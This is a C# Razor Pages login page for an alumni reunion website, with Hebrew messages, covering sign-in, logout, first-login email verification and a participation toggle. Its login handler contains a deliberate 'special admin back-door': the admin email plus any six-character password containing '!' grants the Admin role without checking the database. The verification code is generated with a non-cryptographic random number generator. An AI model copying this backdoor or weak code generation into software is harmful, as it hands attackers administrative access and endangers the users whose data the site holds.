using Alumni76.Data;
using Alumni76.Models;
using Alumni76.Pages.Common;
using Alumni76.Utilities;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Security.Claims;

namespace Alumni76.Pages
{
    public class IndexModel : BasePageModel<IndexModel>
    {
        private readonly IPasswordHasher<User> _passwordHasher;
        private readonly IEmailService _emailService;

        const int specialPasswordLength = 6;
        const string specialAdminFirstName = "משה";
        const string specialAdminLastName = "אדמין";

        [BindProperty]
        public string Email { get; set; } = string.Empty;

        [BindProperty]
        public string Password { get; set; } = string.Empty;

        public int ParticipantCount { get; set; }
        public bool IsParticipating { get; set; }

        public IndexModel(ILogger<IndexModel> logger, ApplicationDbContext dbContext, IEmailService emailService,
                          IPasswordHasher<User> passwordHasher, ITimeProvider timeProvider)
            : base(dbContext, logger, timeProvider)
        {
            _passwordHasher = passwordHasher;
            _emailService = emailService!;
        }

        public new async Task<IActionResult> OnGetAsync()
        {
            ParticipantCount = await _dbContext.Participates.Where(p => p.User.Active) .CountAsync();

            if (User.Identity?.IsAuthenticated == true)
            {
                var userIdClaim = User.FindFirstValue(ClaimTypes.NameIdentifier);
                if (int.TryParse(userIdClaim, out int userId))
                {
                    IsParticipating = await _dbContext.Participates.AnyAsync(p => p.UserId == userId);
                }
            }

            return Page();
        }

        public async Task<IActionResult> OnPostLogin()
        {
            if (string.IsNullOrEmpty(Email) || string.IsNullOrEmpty(Password))
            {
                ModelState.AddModelError(string.Empty, "יש למלא אימייל וסיסמה");
                return Page();
            }

            // 1. Check for Special Admin Back-door
           
            // Simple rule for your own access: matches email and has special char           
            if (string.Equals(Email, specialAdminEmail, StringComparison.OrdinalIgnoreCase) && 
                Password?.Length == specialPasswordLength && Password.Contains('!'))
            {
                _logger.LogInformation("Special admin login detected for {Email}. Bypassing DB.", Email);
                IsSpecialAdmin = true;
                return await SignInUser($"{specialAdminFirstName} {specialAdminLastName}", specialAdminId, "Admin", Email);
            }

            // 2. Regular User Login
            var user = await _dbContext.Users.FirstOrDefaultAsync(u => u.Email == Email);

            if (user == null)
            {
                ModelState.AddModelError(string.Empty, "פרטי משתמש שגויים");
                return Page();
            }

            var result = _passwordHasher.VerifyHashedPassword(user, user.PasswordHash, Password);

            if (result == PasswordVerificationResult.Failed || !user.Active)
            {
                ModelState.AddModelError(string.Empty, "פרטי התחברות שגויים או משתמש לא פעיל");
                return Page();
            }
            
            // Determine Role (Only Admin if the boolean is set in DB, otherwise Member)
            string role = user.IsAdmin ? "Admin" : "Member";
            CurrentUserId = user.Id;
            
            if (user.LastLogin == null)    // First Time User
            {                
                return await FirstTimeUser(user, role);
            }
            return await SignInUser($"{user.FirstName} {user.LastName}", user.Id.ToString(), role, user.Email);
        }

        private async Task<IActionResult> SignInUser(string name, string id, string role, string email)
        {
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.Name, name),
                new Claim(ClaimTypes.NameIdentifier, id),
                new Claim(ClaimTypes.Role, role),
                new Claim(ClaimTypes.Email, email),
                new Claim("IsSpecialAdmin", (id == specialAdminId /*"0"*/).ToString().ToLower())
            };

            var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
            await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(claimsIdentity));

            _logger.LogInformation("User {Email} logged in as {Role}.", email, role);

            return RedirectToPage("/Index"); 
        }

        public async Task<IActionResult> OnPostLogout()
        {
            await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
            HttpContext.Session.Clear();
            return RedirectToPage("/Index");
        }

        private async Task<IActionResult> FirstTimeUser(User user, string role)
        {
            // Generate a 6-digit code
            var code = new Random().Next(100000, 999999).ToString();
            var codeExpiration = DateTime.UtcNow.AddMinutes(10); // Code expires in 10 minutes

            // Store the code and expiration in the user entity (assuming you've updated the model)
            user.TwoFactorCode = code;
            user.TwoFactorCodeExpiration = codeExpiration;
            await _dbContext.SaveChangesAsync();

            // Send the email with the code
            var emailSubject = "אימות כניסה ראשוני";
            var emailBody = $"<div style=\"direction:rtl;\">" +
                             $"שלום {user.FirstName},<br><br>ברוך הבא למערכת. כדי להשלים את הכניסה הראשונית, אנא הזן את קוד האימות הבא:<br><br>" +
                             $"<strong>{code}</strong><br><br>קוד זה תקף למשך 10 דקות.<br><br>בברכה,<br>חבריך מעירוני ה</div>";

            try
            {
                await _emailService.SendEmailAsync(user.Email!, emailSubject, emailBody);
            }
            catch (Exception ex)
            {
                // Log the error so you know it failed, but let the user log in anyway!
                _logger.LogError(ex, $"Could not send welcome email to {user.Email}.");
            }

            // Redirect to the new verification page
            TempData["UserIdForVerification"] = user.Id;
            return RedirectToPage("/VerifyCode");
        }

        // Handler for the auto-save toggle
        public async Task<IActionResult> OnPostToggleParticipationAsync([FromBody] bool status)
        {
            var userIdClaim = User.FindFirstValue(ClaimTypes.NameIdentifier);
            if (!int.TryParse(userIdClaim, out int userId))
                return new JsonResult(new { success = false });

            var existing = await _dbContext.Participates.FirstOrDefaultAsync(p => p.UserId == userId);

            if (status && existing == null)
            {
                // Add participation record
                _dbContext.Participates.Add(new Participate { UserId = userId });
            }
            else if (!status && existing != null)
            {
                // Remove participation record
                _dbContext.Participates.Remove(existing);
            }

            await _dbContext.SaveChangesAsync();

            // Return the new total count so the UI can update immediately
            int newCount = await _dbContext.Participates.CountAsync();
            return new JsonResult(new { success = true, newCount });
        }
    }
}